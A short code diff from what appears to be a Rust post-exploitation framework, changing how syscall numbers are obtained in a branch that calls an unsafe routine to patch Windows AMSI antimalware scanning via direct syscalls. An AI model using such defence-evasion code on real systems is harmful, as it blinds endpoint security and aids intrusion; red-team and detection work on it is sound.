@@ -520,7 +520,7 @@ async fn dispatch_amsi(
             }
         }
         "AMSI Patch (Direct Syscall)" => {
-            let numbers = overthrone_core::postex::syscall::SyscallNumbers::resolve();
+            let numbers = overthrone_core::postex::syscall::SyscallNumbers::default();
             // SAFETY: Called from operator-controlled process for post-exploitation
             let result = unsafe { overthrone_core::postex::opsec::patch_amsi_direct(&numbers) };
             match result {
